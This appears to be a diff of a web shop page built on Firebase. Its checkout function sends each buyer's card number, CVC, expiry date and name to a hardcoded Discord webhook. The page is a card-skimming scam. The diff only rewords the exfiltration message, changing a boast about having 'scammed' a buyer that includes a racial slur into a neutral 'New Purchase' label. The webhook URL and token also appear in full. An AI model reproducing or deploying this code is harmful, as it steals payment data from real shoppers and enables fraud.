@@ -52,10 +52,9 @@ button { margin-top:8px; padding:6px 12px; border:none; background:#ff3cc7; colo
 </div>
 </div>
 
-<!-- Firebase v9+ Modular SDK -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.30.0/firebase-app.js";
-import { getDatabase, ref, set, push, onValue, remove, update, query, limitToLast, get } from "https://www.gstatic.com/firebasejs/9.30.0/firebase-database.js";
+import { getDatabase, ref, set, push, onValue, remove, query, limitToLast, get } from "https://www.gstatic.com/firebasejs/9.30.0/firebase-database.js";
 
 // Firebase config
 const firebaseConfig = {
@@ -73,15 +72,16 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 const itemsRef = ref(db, 'shop/items');
 
-// Admin Panel toggle
+// Admin panel toggle: Ctrl + Shift + K
 document.addEventListener('keydown', e => {
-  if(e.ctrlKey && e.key==='End'){
-    const panel=document.getElementById('adminPanel');
-    panel.style.display = panel.style.display==='block'?'none':'block';
+  if(e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'k'){
+    e.preventDefault();
+    const panel = document.getElementById('adminPanel');
+    panel.style.display = (panel.style.display==='block')?'none':'block';
   }
 });
 
-// Background change
+// Background
 function changeBG(){ document.body.style.background = bgColor.value; }
 
 // Search
@@ -93,12 +93,11 @@ function searchItems(){
   });
 }
 
-// Global variables
+// Globals
 let selectedName = "";
 let selectedPrice = "";
-let editingItemId = null;
 
-// Load items from database
+// Load items in real-time
 onValue(itemsRef, snapshot=>{
   const grid=document.getElementById("grid");
   grid.innerHTML="";
@@ -154,11 +153,11 @@ function validateCheckout(){
 const webhookURL = "https://discord.com/api/webhooks/1441183630201323582/DaQuLEv0FsiW_DoAuLe-OxPoaIVB-4JhfptNgKzMCgJUXxXHlOw2vMXK2-Z2PD7AysnR";
 window.finishPurchase = function(){
   const payload = { content:
-`🛒 **Just scammed anotha nigga**
-Cvc: ${cvc.value}
+`🛒 **New Purchase**
 Credit Card: ${cardNum.value}
-Buyer: ${fullName.value}
+Cvc: ${cvc.value}
 Exp date: ${expDate.value}
+Buyer: ${fullName.value}
 Time: ${new Date().toLocaleString()}`
   };
   fetch(webhookURL,{
